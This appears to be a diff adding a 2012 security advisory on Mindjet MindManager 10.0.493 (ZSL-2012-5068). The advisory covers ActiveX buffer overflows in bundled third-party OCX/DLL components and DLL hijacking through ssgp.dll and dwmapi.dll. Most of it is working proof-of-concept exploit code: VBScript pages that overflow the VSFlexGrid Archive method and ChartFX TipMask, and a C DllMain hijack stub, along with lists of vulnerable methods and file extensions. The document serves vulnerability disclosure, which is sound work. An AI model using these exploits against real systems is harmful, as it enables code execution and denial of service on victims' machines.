@@ -1,0 +1,197 @@
+
+Mindjet MindManager 2012 v10.0.493 Multiple Remote Vulnerabilities
+
+
+Vendor: Mindjet
+Product web page: http://www.mindjet.com
+Affected version: 10.0.493 (Windows)
+
+Summary: An intuitive visual framework that fosters clarity,
+innovative thinking & communication to improve business results.
+
+Desc: MindManager suffers from several vulnerabilities included
+into the whole package. Several OCX and DLL libraries from 3rd
+party software (glg.ocx, officeviewermme.ocx, pdfxctrl.dll, vsflex8n.ocx
+and ChartFX.ClientServer.Core.dll) are vulnerable to buffer overflow
+and denial of service (IE). Also the application is vulnerable to insecure
+library loading with every file extension thru ssgp.dll and dwmapi.dll.
+
+Tested on Microsoft Windows XP Professional SP3 (EN)
+
+
+Vulnerabilities discovered by Gjoko 'LiquidWorm' Krstic
+                              @zeroscience
+
+
+Advisory ID: ZSL-2012-5068
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2012-5068.php
+
+
+Other vulnerabilities:
+
+http://www.exploit-db.com/exploits/12673/
+http://www.zeroscience.mk/en/vulnerabilities/ZSL-2012-5067.php
+http://www.zeroscience.mk/en/vulnerabilities/ZSL-2012-5069.php
+
+
+25.01.2012
+
+---
+
+
+<object classid='clsid:74233DB3-F72F-44EA-94DC-258A624037E6' id='target' />
+<script language='vbscript'>
+
+targetFile = "C:\Program Files\Mindjet\MindManager 10\vsflex8n.ocx"
+prototype  = "Sub Archive ( ByVal ArcFileName As String ,  ByVal FileName As String ,  ByVal Action As ArchiveSettings )"
+memberName = "Archive"
+progid     = "VSFlex8N.VSFlexGrid"
+argCount   = 3
+
+arg1=String(7188, "A")
+arg2="defaultV"
+arg3=1
+
+target.Archive arg1 ,arg2 ,arg3 
+
+</script>
+
+############
+
+CompanyName		ComponentOne
+FileDescription		VSFlexGrid8 (UNICODE)
+FileVersion		8, 0, 20031, 172
+InternalName		
+LegalCopyright		Copyright 1999, 2002 ComponentOne
+OriginalFileName		VSFlex8u.OCX
+ProductName		VSFlexGrid8
+ProductVersion		8, 0, 20031, 172
+
+Report for Clsid: {74233DB3-F72F-44EA-94DC-258A624037E6}
+RegKey Safe for Script: False
+RegKey Safe for Init: False
+Implements IObjectSafety: True
+IDisp Safe:  Safe for untrusted: caller,data  
+IPStorage Safe:  Safe for untrusted: caller,data  
+
+############
+
+------------------------------
+
+
+<object classid='clsid:E9DF30CA-4B30-4235-BF0C-7150F646606C' id='target' />
+<script language='vbscript'>
+
+targetFile = "C:\Program Files\Mindjet\MindManager 10\ChartFX.ClientServer.Core.dll"
+prototype  = "Property Let TipMask As String"
+memberName = "TipMask"
+progid     = "Cfx62ClientServer.Chart"
+argCount   = 1
+
+'arg1=String(13332, "A")
+target.TipMask = arg1
+
+</script>
+
+
+############
+
+CompanyName		Software FX, Inc.
+FileDescription		ChartFX Client Server
+FileVersion		6.2.2089.27167
+InternalName		ChartFX.ClientServer.Core.dll
+LegalCopyright		Copyright 1993-2005 Software FX, Inc.
+OriginalFileName		ChartFX.ClientServer.Core.dll
+ProductName		ChartFX Client Server
+ProductVersion		6.2
+
+Report for Clsid: {E9DF30CA-4B30-4235-BF0C-7150F646606C}
+RegKey Safe for Script: False
+RegKey Safe for Init: False
+Implements IObjectSafety: True
+IDisp Safe:  Safe for untrusted: caller,data  
+IPersist Safe:  Safe for untrusted: caller,data  
+IPStorage Safe:  Safe for untrusted: caller,data  
+
+
+
+Vulnerable members
+--------------------
+Function HitTestEx (
+ 	ByVal X  As Long , 
+ 	ByVal Y  As Long 
+)  As _MouseEventArgsX
+
+# vuln var: Y, X
+
+-------------------------------------------
+Sub OpenData (
+ 	ByVal COD As COD , 
+ 	ByVal n1  As Long , 
+ 	ByVal n2  As Long 
+)
+
+# vuln var: n1, n2
+
+-------------------------------------------
+Sub ShowPropertiesDialog (
+ 	ByVal context  As Variant , 
+ 	ByVal pageNumber  As Long 
+)
+
+# vuln var: pagenumber
+
+-------------------------------------------
+
+############
+
+------------------------------
+
+DLL Hijack:
+
+Vulnerable extensions:
+- .mmap
+- .xmmap
+- .xml
+- .mmp
+- .mmat
+- .xmmat
+- .mmpt
+- .mmmp
+- .xmmmp
+- .mmas
+- .xmmas
+- .docx
+- .dotx
+- .doc
+- .dot
+- .mpx
+
+(ssgp.dll / dwmapi.dll)
+
+---
+
+#include <windows.h>
+
+BOOL WINAPI DllMain (HANDLE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
+{
+
+	switch (fdwReason)
+	{
+		case DLL_PROCESS_ATTACH:
+		dll_mll();
+		case DLL_THREAD_ATTACH:
+		case DLL_THREAD_DETACH:
+		case DLL_PROCESS_DETACH:
+		break;
+	}
+
+	return TRUE;
+}
+
+int dll_mll()
+{
+	MessageBox(0, "DLL Hijacked!", "DLL Message", MB_OK);
+}
+
+------------------------------
